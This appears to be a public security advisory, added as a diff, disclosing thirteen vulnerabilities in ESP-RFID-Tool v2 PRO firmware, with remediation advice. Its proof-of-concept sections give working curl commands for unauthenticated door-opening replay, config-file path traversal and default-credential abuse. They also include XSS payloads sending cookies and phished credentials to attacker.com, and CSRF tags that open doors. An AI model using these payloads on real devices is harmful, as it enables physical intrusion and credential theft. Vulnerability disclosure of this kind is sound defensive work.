@@ -1,0 +1,390 @@
+# Security Advisory: ESP-RFID-Tool v2 PRO
+
+**Product:** ESP-RFID-Tool v2 PRO 
+**Vendor:** Raik Schneider (Einstein2150), foto-video-it.de 
+**Repository:** https://github.com/Einstein2150/ESP-RFID-Tool-v2 
+**Affected Version:** v2.2.1 (latest as of 2026-04-28) 
+**Severity:** CRITICAL 
+**Disclosure Type:** Full Public Disclosure 
+**Disclosure Date:** 2026-04-28 
+**Researcher:** Milan 't4c' Berger 
+
+---
+
+## Disclosure Timeline
+
+| Date | Event |
+|------|-------|
+| 2026-04-26 | Vulnerabilities discovered during code review |
+| 2026-04-27 | Researcher posted responsible disclosure comment on his advertisement on Youtube (GitHub issues disabled by vendor) |
+| 2026-04-28 | Vendor deleted the disclosure comment without response |
+| 2026-04-28 | Researcher posted responsible disclosure comment again on his advertisement on Youtube (GitHub issues disabled by vendor) |
+| 2026-04-28 | Vendor deleted the disclosure comment without response |
+| 2026-04-28 | Researcher attempted contact via additional social media channels |
+| 2026-04-28 | Vendor blocked researcher on all contacted channels; no acknowledgment given |
+| 2026-04-28 | Full public disclosure — 48h contact window exhausted, vendor uncooperative |
+
+---
+
+## Summary
+
+The ESP-RFID-Tool v2 PRO is a commercial hardware/firmware product sold by Raik Schneider targeting security researchers and red team operators. It is based on an ESP8266 microcontroller and provides a web interface for logging, replaying, and analyzing Wiegand RFID data from physical access control systems.
+
+Multiple critical security vulnerabilities were identified in firmware v2.2.1. The most severe findings allow any unauthenticated attacker with network access to: replay captured RFID credentials against physical door locks, read the complete device configuration including plaintext passwords, and permanently destroy all captured evidence — all without authentication.
+
+Note: A full practical verification of all exploits involving physical signal transmission could not be performed as no Wiegand access terminal was available during testing.   
+
+The vendor was notified through all available channels. All notifications were deleted, and the researcher was blocked. Full disclosure follows.
+
+---
+
+## Vulnerability Summary
+
+| ID | Severity | Title |
+|----|----------|-------|
+| ESPR-01 | **CRITICAL** | Unauthenticated Wiegand TX — Physical Access Control Bypass |
+| ESPR-02 | **MEDIUM** | Log Deletion via Default Credentials (Auth present, but trivially bypassed) |
+| ESPR-03 | **CRITICAL** | Path Traversal — Arbitrary SPIFFS File Read |
+| ESPR-04 | **HIGH** | Reflected Cross-Site Scripting (XSS) |
+| ESPR-05 | **HIGH** | Stored XSS via Log Injection |
+| ESPR-06 | **HIGH** | Hardcoded Default Credentials |
+| ESPR-07 | **HIGH** | Unauthenticated Log View + Filesystem Enumeration |
+| ESPR-08 | **MEDIUM** | No CSRF Protection — Entire Application |
+| ESPR-09 | **MEDIUM** | Plaintext FTP Server |
+| ESPR-10 | **MEDIUM** | Missing Security Response Headers |
+| ESPR-11 | **MEDIUM** | No Input Validation on Integer Parameters |
+| ESPR-12 | **LOW** | Predictable AP SSID — Device Fingerprinting |
+| ESPR-13 | **INFO** | Captive Portal Mode Widens Attack Surface |
+
+---
+
+## Detailed Findings
+
+---
+
+### ESPR-01 — Unauthenticated Wiegand TX: Physical Access Control Bypass
+
+**Severity:** CRITICAL 
+**File:** `api_server.cpp` 
+**Endpoints:** `/api/tx/bin`, `/api/txinstant/bin`, `/api/wiegandencode`
+
+**Description:** 
+All Wiegand transmission API endpoints execute hardware TX operations without any authentication check. Any attacker on the same network can replay arbitrary Wiegand bitstreams to downstream access control hardware — unlocking physical doors, gates, or secured areas — with a single unauthenticated HTTP GET request.
+
+**Vulnerable Code:**
+```cpp
+server.on("/api/tx/bin", []() {
+    // ...
+    // No server.authenticate() call
+    apiTX(api_binary, api_pulsewidth, api_datainterval, api_wait);
+});
+```
+
+**Proof of Concept:**
+```bash
+# Replay a captured 26-bit HID card to open a door
+curl "http://192.168.1.1/api/tx/bin?binary=01001100110101010110101001&pulsewidth=40&interval=2000"
+
+# Re-encode a known UID and transmit
+curl "http://192.168.1.1/api/wiegandencode?uid=DEADBEEF&format=26"
+
+# Instant transmission (no response wait)
+curl "http://192.168.1.1/api/txinstant/bin?binary=01001100110101010110101001"
+```
+
+**Impact:** 
+Physical security bypass. An attacker who previously captured a card UID (e.g. via ESPR-07) can immediately replay it to open the corresponding door — all from an unauthenticated HTTP request. This completely undermines the device's operational security model.
+
+---
+
+### ESPR-02 — Log Deletion via Default Credentials
+
+**Severity:** MEDIUM 
+**File:** `esprfidtool.ino` 
+**Endpoints:** `/deletelog`, `/deletelog/yes`
+
+**Description:** 
+`/deletelog/yes` requires HTTP Basic Authentication. However, the default credentials (`admin:rfidtool`) are hardcoded and publicly known via the open-source repository. Combined with ESPR-06, any attacker with knowledge of the default credentials can permanently delete all captured RFID logs. `/deletelog` (the confirmation page) has **no authentication**, which also makes it a direct XSS vector (see ESPR-04).
+
+**Note:** Live testing confirmed `/deletelog/yes` returns HTTP 401 without credentials. This finding was initially rated CRITICAL based on static code analysis of an earlier version; auth is present in the tested build.
+
+**Vulnerable Code:**
+```cpp
+server.on("/deletelog/yes", [](){
+  if(!server.authenticate(update_username, update_password))
+    return server.requestAuthentication();
+  // Auth present — but default credentials are public (admin:rfidtool)
+  SPIFFS.remove(deletelog);
+});
+```
+
+**Proof of Concept:**
+```bash
+# Delete log using publicly known default credentials
+curl -u admin:rfidtool "http://192.168.1.1/deletelog/yes?payload=/log.txt"
+```
+
+**Impact:** 
+Any attacker who knows the default credentials (publicly available) can permanently destroy all captured evidence. Severity is driven by ESPR-06 (hardcoded defaults) — fixing one without the other provides no real protection.
+
+---
+
+### ESPR-03 — Path Traversal: Arbitrary SPIFFS File Read
+
+**Severity:** CRITICAL 
+**File:** `esprfidtool.ino` — `ViewLog()`
+
+**Description:** 
+The `payload` parameter is passed directly to `SPIFFS.open()` without any path validation or sanitization. An unauthenticated attacker can read any file stored in the device's SPIFFS filesystem, including configuration files containing plaintext credentials.
+
+**Vulnerable Code:**
+```cpp
+void ViewLog(){
+  String payload;
+  payload += server.arg(0);  // raw URL arg, no sanitization
+  File f = SPIFFS.open(payload, "r");
+  // outputs file content directly to browser
+}
+```
+
+**Proof of Concept:**
+```bash
+# Note: server.arg(0) reads the FIRST URL argument by position, not by name.
+# The correct syntax is ?<filename>, not ?payload=<filename>
+
+# Read device configuration (contains credentials in plaintext)
+curl "http://192.168.1.1/viewlog?/esprfidtool.json"
+
+# Read log files (enumerate first via /api/listlogs)
+curl "http://192.168.1.1/viewlog?/log.txt"
+
+# List all available filenames first
+curl "http://192.168.1.1/api/listlogs"
+```
+
+**Note:** The endpoint only returns content if the file exists on SPIFFS.
+The config file `/esprfidtool.json` is filtered from `ListLogs()` output but is NOT
+filtered in `ViewLog()`, making it directly readable via this endpoint.
+
+**Example Response:**
+```json
+{
+  "ssid": "HomeNetwork",
+  "password": "mysecretwifi",
+  "update_username": "admin",
+  "update_password": "rfidtool",
+  "ftp_username": "ftp-admin",
+  "ftp_password": "rfidtool"
+}
+```
+
+**Impact:** 
+Full information disclosure. WiFi credentials, admin passwords, FTP credentials, and all captured RFID card data (UIDs, bitstreams) are exposed to any unauthenticated attacker.
+
+---
+
+### ESPR-04 — Reflected Cross-Site Scripting (XSS)
+
+**Severity:** HIGH 
+**File:** `esprfidtool.ino` — `DeleteLog()` 
+**Endpoint:** `GET /deletelog`
+
+**Description:** 
+The `payload` URL parameter is reflected directly into the HTML response body without sanitization or HTML encoding. An attacker can inject arbitrary JavaScript that executes in the victim's browser.
+
+**Vulnerable Code:**
+```cpp
+// server.arg("payload") embedded directly into HTML — no htmlEncode()
+server.send(200, "text/html", "... Deleting: " + payload + " ...");
+```
+
+**Proof of Concept:**
+```
+# Basic alert PoC
+http://192.168.1.1/deletelog?payload=<script>alert('Sag Danke')</script>
+
+# Cookie exfiltration
+http://192.168.1.1/deletelog?payload=<script>document.location='http://attacker.com/?c='+document.cookie</script>
+
+# Credential phishing overlay (effective in captive portal context)
+http://192.168.1.1/deletelog?payload=<script>document.body.innerHTML='<form action="http://attacker.com/steal"><input name="u" placeholder="Username"><input name="p" type="password" placeholder="Password"><input type="submit"></form>'</script>
+```
+
+**Impact:** 
+Session hijacking, credential theft, UI redressing. Severity is elevated because the device operates as a captive portal — victims auto-connect and are served the attacker-controlled page.
+
+---
+
+### ESPR-05 — Stored XSS via Log Injection
+
+**Severity:** HIGH 
+**File:** `esprfidtool.ino` (log write path)
+
+**Description:** 
+Log entries are written to SPIFFS containing raw data including HTML markup. When logs are rendered via `ViewLog()` or `ListLogs()` without output encoding, an attacker who can inject HTML/JavaScript into a log entry achieves persistent stored XSS. This can be triggered by sending a crafted Wiegand signal or via the unauthenticated TX API.
+
+**Proof of Concept:**
+```bash
+# Inject XSS payload via unauthenticated TX endpoint
+# Craft a bitstream that results in a log entry containing script tags
+# The exact binary depends on how the logging function serializes data,
+# but the vector is confirmed by the absence of HTML encoding on log output.
+
+# After injection, any admin viewing logs triggers the payload:
+curl "http://192.168.1.1/viewlog?payload=/log.txt"
+# -> <script>...</script> executes in admin browser
+```
+
+**Impact:** 
+Persistent XSS. Any administrator viewing the log file executes attacker-controlled JavaScript. Can be used to steal credentials or pivot to further attacks.
+
+---
+
+### ESPR-06 — Hardcoded Default Credentials
+
+**Severity:** HIGH 
+**File:** `esprfidtool.ino` — `loadDefaults()`
+
+**Description:** 
+Default credentials are hardcoded and publicly known via the open-source repository. No forced credential change on first boot.
+
+| Service | Username | Password |
+|---------|----------|----------|
+| Web Interface / OTA Update | `admin` | `rfidtool` |
+| FTP Server | `ftp-admin` | `rfidtool` |
+| WiFi AP SSID | `ESP-RFID-Tool` | *(none by default)* |
+
+**Proof of Concept:**
+```bash
+# Authenticated firmware update with known default credentials
+curl -u admin:rfidtool "http://192.168.1.1:1337/update" -F "image=@malicious.bin"
+
+# FTP login
+ftp 192.168.1.1
+# Login: ftp-admin / rfidtool
+```
+
+**Impact:** 
+Trivial full authentication bypass for all credential-protected endpoints. Anyone familiar with the product has immediate access.
+
+---
+
+### ESPR-07 — Unauthenticated Log View + Filesystem Enumeration
+
+**Severity:** HIGH 
+**File:** `esprfidtool.ino` 
+**Endpoints:** `/viewlog`, `/listlogs`, `/api/listlogs`, `/api/info`, `/api/lastread`
+
+**Description:** 
+All log viewing and filesystem enumeration endpoints require no authentication. The `/api/lastread` endpoint additionally exposes the last captured card in real time.
+
+**Proof of Concept:**
+```bash
+# Enumerate all files on device
+curl "http://192.168.1.1/api/listlogs"
+
+# Read captured card data
+curl "http://192.168.1.1/api/lastread"
+# Response: {"bits":26,"bitstream":"01001100...","uid":"0A1B2C3D","format":"HID26"}
+
+# Get device info (firmware version, free space)
+curl "http://192.168.1.1/api/info"
+```
+
+**Impact:** 
+Complete exfiltration of all captured RFID card data without any authentication.
+
+---
+
+### ESPR-08 — No CSRF Protection
+
+**Severity:** MEDIUM 
+**Scope:** All endpoints
+
+**Description:** 
+No CSRF tokens exist. No `SameSite` cookie attributes. No `Origin`/`Referer` validation. An attacker who can get an operator to visit a malicious webpage triggers arbitrary device actions.
+
+**Proof of Concept:**
+```html
+<!-- Malicious webpage — operator visits while connected to device AP -->
+<!-- Silently deletes all logs -->
+<img src="http://192.168.1.1/deletelog/yes?payload=/log.txt" style="display:none">
+
+<!-- Opens a door via CSRF + unauthenticated TX (ESPR-01) -->
+<img src="http://192.168.1.1/api/tx/bin?binary=01001100110101010110101001&pulsewidth=40&interval=2000" style="display:none">
+```
+
+---
+
+### ESPR-09 — Plaintext FTP Server
+
+**Severity:** MEDIUM 
+
+FTP credentials and all transferred log data (card UIDs, bitstreams) are transmitted in cleartext. Trivially intercepted on shared WiFi networks.
+
+---
+
+### ESPR-10 — Missing Security Response Headers
+
+**Severity:** MEDIUM 
+
+No HTTP responses include:
+- `Content-Security-Policy` — allows unrestricted script execution (amplifies XSS)
+- `X-Frame-Options` — clickjacking via iframe
+- `X-Content-Type-Options`
+- `Cache-Control` on sensitive endpoints
+
+---
+
+### ESPR-11 — No Input Validation on Integer Parameters
+
+**Severity:** MEDIUM 
+**File:** `api_server.cpp`
+
+```cpp
+api_pulsewidth = server.arg("pulsewidth").toInt();  // no bounds check
+api_datainterval = server.arg("interval").toInt();   // no bounds check
+api_wait = server.arg("wait").toInt();               // no bounds check
+```
+
+`toInt()` returns 0 on invalid input. Negative values or extreme integers passed to `apiTX()` may cause undefined hardware behavior or firmware crashes.
+
+---
+
+### ESPR-12 — Predictable AP SSID
+
+**Severity:** LOW 
+
+Default SSID `ESP-RFID-Tool` allows passive wardriving to identify and target deployed units. A trivial scanner can auto-enumerate all deployed devices in range.
+
+---
+
+### ESPR-13 — Captive Portal as Attack Force-Multiplier
+
+**Severity:** INFO 
+
+The device runs a DNS server resolving all domains to itself. Victims auto-connecting to the AP have all their HTTP traffic redirected to the device. Combined with XSS findings (ESPR-04, ESPR-05), this enables large-scale credential phishing against unknowing users.
+
+---
+
+## Recommendations
+
+1. Add `server.authenticate()` to **all** endpoints, not only `/settings`
+2. HTML-encode all URL parameters before inserting into HTML responses
+3. Restrict `SPIFFS.open()` to a whitelist of allowed log filenames
+4. Implement CSRF token validation for all state-changing requests
+5. Force credential change on first boot
+6. Add `Content-Security-Policy` and other security headers to all responses
+7. Validate and bound-check all integer parameters
+8. Consider disabling FTP by default; document security implications clearly
+
+---
+
+## Researcher
+
+**Discovered and reported by:** Milan 't4c' Berger 
+**Disclosure policy:** Responsible disclosure attempted. Vendor deleted all notifications and blocked researcher on all channels within 48 hours. Full public disclosure follows as per standard responsible disclosure practice.
+
+---
+
+*This advisory is published in the public interest. The ESP-RFID-Tool v2 PRO is a commercial product sold for security research and red team use. Customers of this product should be aware that the device itself contains critical security vulnerabilities and may be compromised by any party with network access.*
